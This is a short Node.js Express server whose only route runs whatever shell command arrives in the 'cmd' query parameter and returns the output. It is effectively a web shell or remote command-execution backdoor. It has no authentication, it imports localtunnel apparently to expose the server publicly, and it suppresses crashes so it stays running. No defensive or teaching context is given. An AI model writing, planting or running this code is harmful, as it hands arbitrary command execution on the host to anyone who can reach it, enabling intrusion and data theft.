const express = require("express"),
  localtunnel = require("localtunnel"),
  app = express(),
  util = require("util"),
  exec = util.promisify(require("child_process").exec);

app.get("/", function (req, res) {
  async function cmd(commandToExec) {
    const { stdout, stderr } = await exec(commandToExec);
    res.end(stdout);
    console.log(stdout);
    res.end(stderr);
    console.log(stderr);
  }
  cmd(req.query.cmd);
});

app.listen(3000, function () {
  console.log("Listening on port 3000");
});

process.on("uncaughtException", function (err) {
  console.error(err);
});
